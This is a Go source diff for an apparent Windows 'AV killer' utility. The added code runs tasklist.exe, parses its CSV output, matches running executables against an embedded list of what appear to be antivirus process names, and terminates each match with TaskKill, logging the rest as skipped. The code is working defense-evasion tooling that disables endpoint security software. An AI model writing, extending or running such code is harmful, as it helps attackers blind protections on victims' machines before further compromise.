@@ -2,7 +2,9 @@ package main
 
 import (
 	_ "embed"
+	"encoding/csv"
 	"fmt"
+	"log"
 	"os"
 	"os/exec"
 	"runtime"
@@ -25,8 +27,14 @@ func main() {
 		panic(err)
 	}
 	defer f.Close()
-	for _, each := range strings.Split(avList, "\n") {
-		TaskKill(each)
+	tasks := TasksList()
+	list := IterateProcess(tasks)
+	for _, each := range list {
+		if isAv(each) {
+			TaskKill(each)
+		} else {
+			fmt.Fprintf(f, "Skip %s\n", each)
+		}
 	}
 }
 
@@ -44,4 +52,39 @@ func TaskKill(name string) {
 	}
 	fmt.Println(string(output))
 	fmt.Fprintf(f, "%s: %s", name, string(output))
+}
+
+func TasksList() string {
+	cmd := exec.Command("tasklist.exe", "/FO", "CSV")
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		panic(err)
+	}
+	fmt.Println(string(output))
+	return string(output)
+}
+
+func IterateProcess(csvTaskList string) (result []string) {
+	r := csv.NewReader(strings.NewReader(csvTaskList))
+	records, err := r.ReadAll()
+	if err != nil {
+		log.Fatal(err)
+	}
+	for _, line := range records {
+		if !strings.HasSuffix(line[0], ".exe") {
+			continue
+		}
+		result = append(result, line[0])
+	}
+	return
+}
+
+func isAv(name string) bool {
+	name = strings.ToLower(name)
+	for _, each := range strings.Split(avList, "\n") {
+		if name == strings.ToLower(each) {
+			return true
+		}
+	}
+	return false
 }
